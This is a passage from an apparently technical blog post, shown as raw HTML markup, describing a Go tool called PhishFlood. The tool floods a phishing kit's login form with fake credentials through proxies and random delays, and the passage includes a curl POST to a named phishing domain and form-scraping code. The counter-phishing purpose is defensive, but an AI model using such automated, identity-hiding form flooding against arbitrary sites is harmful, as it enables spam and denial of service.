	    	    &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_camp4&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Si&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tabindex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;&amp;gt;
	    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;button&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;background-color: green;font-size : 20px;&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;
	    	&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;btn btn-primary btn-lg btn-block&amp;#34;&lt;/span&gt;&amp;gt;ENTRA&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;button&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;action&lt;/code&gt; attribute of the form specifies where the POST request is sent, in this case to &lt;code&gt;/core/login.php&lt;/code&gt;. Using this address and the attributes &lt;code&gt;name&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt; of the input fields, we can easily make a post with cURL:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;codice=123&amp;amp;password=123&amp;amp;cellulare=12345678&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -X POST https://www.riscontrotitolare.com/core/login.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Please note that this kit is also logging the IP address of these requests, so be sure to run the line above behind a proxy or a VPN.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishflood/logs-curl.png&#34;
         alt=&#34;The POST made with cURL worked!&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;The POST made with cURL worked!&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;After being sure that the POST request made it with cURL worked, we can start writing the code.&lt;/p&gt;
&lt;h2 id=&#34;phishflood-writing-the-code&#34;&gt;PhishFlood: writing the code&lt;/h2&gt;
&lt;p&gt;The idea of &lt;code&gt;phishflood&lt;/code&gt; is to have a program that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;automatically detects the required attributes of the form and of the input fields&lt;/li&gt;
&lt;li&gt;makes POST requests with random data which are non easily distinguishable from authentic data&lt;/li&gt;
&lt;li&gt;uses various proxies to make requests (to hide our IP)&lt;/li&gt;
&lt;li&gt;wait a random time between two requests, to not create an obvious time frame of when the program was executed&lt;/li&gt;
&lt;li&gt;makes use of the goroutines to improve efficiency&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For the first point, I decided to use &lt;a href=&#34;https://godoc.org/github.com/PuerkitoBio/goquery&#34;&gt;goquery&lt;/a&gt; to detect the &lt;code&gt;form&lt;/code&gt;, get the content of the &lt;code&gt;action&lt;/code&gt; attribute, and the &lt;code&gt;name&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt; attributes of the other input parameters.&lt;/p&gt;
&lt;p&gt;For brevity reasons, I excluded from the code below all the lines for handling possible errors.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getPostData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;phishingUrl&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;parsedProxies&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;)
	(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) {

    &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myClient&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// make post request using proxy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;parsedProxies&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;proxyURL&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Parse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;parsedProxies&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
	    &lt;span style=&#34;color:#75715e&#34;&gt;// be sure to handle the err..
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#a6e22e&#34;&gt;myClient&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Timeout&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;Transport&lt;/span&gt;:
		    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Transport&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Proxy&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProxyURL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;proxyURL&lt;/span&gt;)}}
	} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;myClient&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Timeout&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt; }

	&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewRequest&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;phishingUrl&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myClient&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Do&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;StatusCode&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;status code error: %d %s \n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;StatusCode&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Status&lt;/span&gt;)
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// Load the HTML document and find the form with goquery
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;doc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;goquery&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewDocumentFromReader&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Body&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;doc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Find&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Each&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;goquery&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Selection&lt;/span&gt;) {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;actionOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Attr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;action&amp;#34;&lt;/span&gt;)
	    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;actionOk&lt;/span&gt; {
		    &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Find&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Each&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;goquery&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Selection&lt;/span&gt;) {
			    &lt;span style=&#34;color:#a6e22e&#34;&gt;nameattr&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;nameOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Attr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;)
			    &lt;span style=&#34;color:#a6e22e&#34;&gt;typeattr&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;typeOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Attr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;)
			    &lt;span style=&#34;color:#75715e&#34;&gt;// find input with name and attributes
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;actionOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nameOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;typeOk&lt;/span&gt; {
				    &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;nameattr&lt;/span&gt;)
				    &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;typeattr&lt;/span&gt;)
				    &lt;span style=&#34;color:#a6e22e&#34;&gt;u&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Parse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;phishingUrl&lt;/span&gt;)
				    &lt;span style=&#34;color:#75715e&#34;&gt;// create full url for path where to submit the form
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				    &lt;span style=&#34;color:#a6e22e&#34;&gt;u&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Path&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Join&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;u&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Path&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;)
				    &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;u&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;()
				}
		    })
	}})
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The beginning of the &lt;code&gt;main&lt;/code&gt; function of our code takes the URL of the phishing page in input, calls the function &lt;code&gt;getPostData&lt;/code&gt; (mentioned above) and prints the results:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {

    &lt;span style=&#34;color:#75715e&#34;&gt;// check we have one input provided
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Stderr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please specify one URL: ./phishflood *URL* \n&amp;#34;&lt;/span&gt;)
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// take a url from input
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;phishingUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

    &lt;span style=&#34;color:#75715e&#34;&gt;// validate url provided
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ParseRequestURI&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;phishingUrl&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Stderr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It was not possible to parse the URL\n&amp;#34;&lt;/span&gt;)
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// navigate to it and print findings
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getPostData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;phishingUrl&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Found a form with action: %s \n[!] Input fields names found: %v&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
	    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n[!] Input fields types found: %v\n\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;postAction&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputNames&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inputTypes&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The rest of the &lt;code&gt;main&lt;/code&gt; uses 10 goroutines to make the requests concurrently (&lt;em&gt;well, almost concurrently because we have a random delay&lt;/em&gt;), and a channel ( &lt;code&gt;ch&lt;/code&gt; ) to communicate when a goroutine finished.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// set random seed
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Seed&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Now&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;UnixNano&lt;/span&gt;())

    &lt;span style=&#34;color:#75715e&#34;&gt;// create channel used for goroutines
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;// specify the number of routines to use
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;routines&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// start goroutines
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#a6e22e&#34;&gt;routines&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {

	    &lt;span style=&#34;color:#75715e&#34;&gt;// create wait for a random number of seconds between 2 and 10
